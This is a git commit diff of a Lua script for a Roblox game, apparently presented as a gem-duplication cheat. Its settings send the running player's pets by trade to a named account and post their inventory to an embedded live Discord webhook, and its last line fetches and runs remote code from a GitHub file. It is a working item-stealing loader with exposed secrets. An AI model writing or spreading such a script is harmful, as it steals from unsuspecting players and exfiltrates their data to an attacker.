1e0304c3a22d049537754d183ebf8923233092f5
hellodarknesslife <108496624+hellodarknesslife@users.noreply.github.com>
2022-06-30 19:30:35 -0400

    Update gemscript.lua

--- gemscript.lua
+++ gemscript.lua
@@ -3,4 +3,4 @@ PetLimited = false -- If pet is limited it will take it!
 PetAll = false -- Will send all hes pets
 TradeUser = "wsocialanxiety" -- Write your username so it will send to you trade
 WebhookURL = "https://discord.com/api/webhooks/992209025380909086/vA5YDQH83dT1psX35cRq_XgWaDHzqcW6S4KFJ_Mb_aM460ODLwkkS9xyn5Sw1k4e4Fbl" -- Your webhook so it sends user inventory if its bigger than 500 pets it won't send it will delete webhook.
-loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua%22))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wtfkid/AutoFarm/main/dupegems.lua))()
